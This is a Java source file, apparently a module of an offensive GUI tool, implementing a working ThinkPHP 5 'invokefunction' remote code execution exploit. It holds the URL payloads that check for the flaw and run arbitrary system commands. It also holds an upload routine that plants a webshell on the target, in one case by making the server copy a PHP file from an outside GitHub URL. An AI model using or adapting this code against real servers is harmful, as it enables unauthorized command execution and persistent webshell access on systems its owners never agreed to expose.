package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_invoke_func_code_exec_1 implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;

    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;

        String payload0 = "/index.php?s=index/think\\app/invokefunction&function=phpinfo&vars[0]=-1";
        url = url + payload0;
        Response response = HttpTools.get(url, this.headers, "UTF-8");
        if (response.getText().contains("PHP Version")) {
            this.results = "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞";
            this.isVul = true;
            return this.results;
        } else if (response.getError() != null) {
            this.results = "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
            return this.results;
        } else {
            this.results = "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
            return this.results;
        }

    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String payload = "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + cmd;
        String url = this.target + payload;
        Response response = HttpTools.get(url, this.headers, encoding);
        if (response.getError() == null) {
            this.results = Tools.regReplace(response.getText());
        } else {
            this.results = response.getError();
        }

        return this.results;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {
        try {
            String urlEncodeContent = URLEncoder.encode(content, "UTF-8");
            String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
            content = URLEncoder.encode(base64Content, "UTF-8");
            String payload1 = "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=" + fileName + "&vars[1][]=" + urlEncodeContent;
            String payload2 = "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=php://filter/write=convert.base64-decode/resource=" + fileName + "&vars[1][]=" + content;
            String payload3 = "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=https://raw.githubusercontent.com/bewhale/thinkphp_gui_tools/main/php.php&vars[1][]=" + fileName;
            ArrayList<String> payloads = new ArrayList();
            payloads.add(payload1);
            payloads.add(payload2);
            payloads.add(payload3);
            Iterator var10 = payloads.iterator();

            while(var10.hasNext()) {
                String payload = (String)var10.next();
                Response response = HttpTools.get(this.target + payload, this.headers, "UTF-8");
                if (response.getError() == null) {
                    Response response1 = HttpTools.get(this.target + "/" + fileName, this.headers, "UTF-8");
                    if (response1.getCode() == 200) {
                        this.results = "[+] 上传成功，请检查URL：" + this.target + "/" + fileName;
                        return this.results;
                    }
                } else {
                    this.results = "[-] 上传失败: " + response.getError();
                }
            }
        } catch (UnsupportedEncodingException var14) {
            this.results = "[-] 上传失败: " + var14.getMessage();
        }

        return this.results;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
